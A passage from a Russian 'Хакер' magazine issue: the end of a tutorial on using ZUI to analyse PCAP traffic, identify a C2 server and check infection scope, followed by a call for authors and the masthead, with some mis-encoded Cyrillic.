filename!=null | cut _path, tx_hosts, rx_hosts, conn_uids, mime_
type, filename, md5, sha1

И что же мы видим? Еще один IP-адрес. Закидываем его на VirusTotal и убеж‐
даемся, что он вредоносный.





                       Новый подозрительный адрес

Чтобы удостовериться, что это управляющий сервер, проверим остальные кон‐
некты на этот адрес. Сразу становится очевидно: имеют место «маячковые
отстукивания».





                       Новый подозрительный адрес


Масштаб заражения
Отсортируем трафик по тегам, чтобы представлять самые частые типы вза‐
имодействия между хостами.


_path | count() by _path | sort -r





                      Общая картина по трафику

Хм, можно сказать, что ничего указывающего на дальнейшее распространение
малвари здесь нет. В таких расследованиях обычно рассчитываешь увидеть
активность SMB and DCE/RPC.
   Для уверенности, что заражение не пошло дальше, можно посмотреть кон‐
некты, которые совершал первый (и, надеемся, последний) инфицированный
хост.





                        Масштабного заражения нет

Нам интересны коннекты только из той же подсети. Ничего подозрительного
не наблюдается.


Итоги спидрана
Мы нашли несколько IOC, первый зараженный хост, С2-сервер, а также выяс‐
нили, что дальше хоста 10.9.1.101 заражение не пошло.


ВЫВОДЫ

Сколько времени было потрачено на ожидание, пока Wireshark отобразит (если
вообще отобразит) список вхождений после фильтрации при анализе боль‐
шого файла PCAP... Для многих это становилось настоящим испытанием.
Но теперь ты знаешь про существование ZUI, который заметно упростит твою
работу.
   ZUI, к сожалению, не может стать полноценной заменой Wireshark, он ско‐
рее превращает утомительный процесс в продуктивную работу и бережет нер‐
вы. Но в качестве помощника в анализе трафика он просто незаменим.
   СТАНЬ АВТОРОМ
     «ХАКЕРА»!


«Хакеру» нужны новые авторы, и ты можешь стать одним
из них! Если тебе интересно то, о чем мы пишем, и есть
желание исследовать эти темы вместе с нами, то не упусти
возможность вступить в ряды наших авторов и получать
за это все, что им причитается.


 • Àâòîðû ïîëó÷àþò äåíåæíîå âîçíàãðàæäåíèå. Размер  зависит
   от сложности и уникальности темы и объема проделанной работы (но
   не от объема текста).
 • Íàøè àâòîðû ÷èòàþò «Õàêåð» áåñïëàòíî: каждая опубликованная
   статья приносит месяц подписки и значительно увеличивает личную скид-
    ку. Уже после третьего раза подписка станет бесплатной навсегда.

Кроме того, íàëè÷èå ïóáëèêàöèé — ýòî îòëè÷íûé ñïîñîá ïîêàçàòü
ðàáîòîäàòåëþ è êîëëåãàì, ÷òî òû â òåìå. А еще мы планируем запуск
англоязычной версии, так что ó òåáÿ áóäåò øàíñ áûòü óçíàííûì è çà
ðóáåæîì.
  И конечно, ìû âñåãäà óêàçûâàåì â ñòàòüÿõ èìÿ èëè ïñåâäîíèì
àâòîðà. На сайте ты можешь сам заполнить характеристику, поставить фото,
написать что-то о себе, добавить ссылку на сайт и профили в соцсетях. Или,
наоборот, не делать этого в целях конспирации.


ß ÒÅÕÍÀÐÜ, À ÍÅ ÆÓÐÍÀËÈÑÒ. ÏÎËÓ×ÈÒÑß ËÈ Ó ÌÅÍß ÍÀÏÈÑÀÒÜ
ÑÒÀÒÜÞ?
Главное в нашем деле — знания по теме, а не корочки журналиста. Знаешь
тему — значит, и написать сможешь. Не умеешь — поможем, будешь сом-
неваться — поддержим, накосячишь — отредактируем. Не зря у нас работает
столько редакторов! Они не только правят буквы, но и помогают с темами
и форматом и «причесывают» авторский текст, если в этом есть необ-
ходимость. И конечно, перед публикацией мы согласуем с автором все прав-
ки и вносим новые, если нужно.


ÊÀÊ ÏÐÈÄÓÌÀÒÜ ÒÅÌÓ?
Темы для статей — дело непростое, но и не такое сложное, как может
показаться. Стоит начать, и ты наверняка будешь придумывать темы одну
за другой!
  Первым делом задай себе несколько простых вопросов:
 • «Ðàçáèðàþñü ëè ÿ â ÷åì‑òî, ÷òî ìîæåò çàèíòåðåñîâàòü äðóãèõ?»
   Частый случай: люди делают что-то потрясающее, но считают свое
   занятие вполне обыденным. Если твоя мама и девушка не хотят слушать
   про реверс малвари, сборку ядра Linux, проектирование микропроцес-
   соров или хранение данных в ДНК, это не значит, что у тебя не найдется
   благодарных читателей.
 • «Áûëè ëè ó ìåíÿ â ïîñëåäíåå âðåìÿ èíòåðåñíûå ïðîåêòû?» Если
   ты ресерчишь, багхантишь, решаешь crackme или задачки на CTF, если ты
   разрабатываешь  что-то необычное или даже просто настроил себе
   какую-то удобную штуковину, обязательно расскажи нам! Мы вместе при-
   думаем, как лучше подать твои наработки.
 • «Çíàþ ëè ÿ êàêóþ‑òî èñòîðèþ, êîòîðàÿ êàæåòñÿ ìíå êðóòîé?»
  Попробуй вспомнить: если ты буквально недавно рассказывал кому-то
  о чем-то очень важном или захватывающем (и связанным с ИБ или ИТ), то
   с немалой вероятностью это может быть неплохой темой для статьи.
  Или как минимум натолкнет тебя на тему.
 • «Íå ïîäìå÷àë ëè ÿ, ÷òî â Õàêåðå óïóñòèëè ÷òî‑òî âàæíîå?» Если
  мы о чем-то не писали, это могло быть не умышленно. Возможно, просто
   никому не пришла в голову эта тема или не было человека, который
   взял бы ее на себя. Кстати, даже если писать сам ты не собираешься, под-
   кинуть нам идею все равно можно.


Óãîâîðèëè, êàêîâ ïëàí äåéñòâèé?
 1. Придумываешь актуальную тему или несколько.
 2. Описываешь эту тему так, чтобы было понятно, что будет в статье и зачем
   ее кому-то читать. Обычно достаточно рабочего заголовка и нескольких
   предложений (pro tip: их потом можно пустить на введение).
 3. Выбираешь редактора и отправляешь ему свои темы (можно главреду —
   он разберется). Заодно неплохо бывает представиться и написать пару
   слов о себе.
 4. С редактором согласуете детали и сроки сдачи черновика. Также он выда-
   ет тебе правила оформления и отвечает на все интересующие вопросы.
 5. Пишешь статью в срок и отправляешь ее. Если возникают какие-то проб-
   лемы, сомнения или просто задержки, ты знаешь, к кому обращаться.
 6. Редактор читает статью, принимает ее или возвращает с просьбой
   доработать и руководством к действию.
 7. Перед публикацией получаешь версию с правками и обсуждаешь их
   с редактором (или просто даешь добро).
 8. Дожидаешься выхода статьи и поступления вознаграждения.


TL;DR
Если хочешь публиковаться в «Хакере», придумай тему для первой статьи
и предложи редакции.
   №1 (286)

            Андрей Письменный      Валентин Холмогоров        Илья Русанен
                Главный редактор         Ведущий редактор                Разработка
               pismenny@glc.ru          valentin@holmogorov.ru          rusanen@glc.ru
                                        Евгения Шарипова
                                           Литературный редактор


                          MEGANEWS

                                      Мария Нефёдова
                                            nefedova@glc.ru


                                   АРТ

                                       yambuto
                                       yambuto@gmail.com


                     КОНСУЛЬТАЦИОННЫЙ СОВЕТ

                                  Иван Андреев, Олег Афонин,
                                Марк Бруцкий‑Стемпковский,
                                         Алексей Глазков, Nik Zerof,
                                   Юрий Язев


                             РЕКЛАМА

                                            Анна Яковлева
                                        Директор по спецпроектам
                                             yakovleva.a@glc.ru


                    РАСПРОСТРАНЕНИЕ И ПОДПИСКА

                           Вопросы по подписке:       ​Вопросы по материалам:
                                 lapina@glc.ru                support@glc.ru​





Адрес редакции: 125080, город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Издатель: ИП
Югай Александр Олегович, 400046, Волгоградская область, г. Волгоград, ул. Дружбы народов, д. 54. Учредитель: ООО «Медиа Кар»​ ​125080,
город Москва, Волоколамское шоссе, дом 1, строение 1, этаж 8, помещение IX, комната 54, офис 7. Зарегистрировано в Федеральной службе
по надзору в сфере связи, информационных технологий и массовых коммуникаций (Роскомнадзоре), свидетельство ​Эл № ​ФС77-​67001 от ​30.​08.​
2016 года. Мнение редакции не обязательно совпадает с мнением авторов. Все материалы в номере предоставляются как информация к раз‐
мышлению. Лица, использующие данную информацию в противозаконных целях, могут быть привлечены к ответственности. Редакция не несет
ответственности за содержание рекламных объявлений в номере. По вопросам лицензирования и получения прав на использование редакцион‐
ных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2022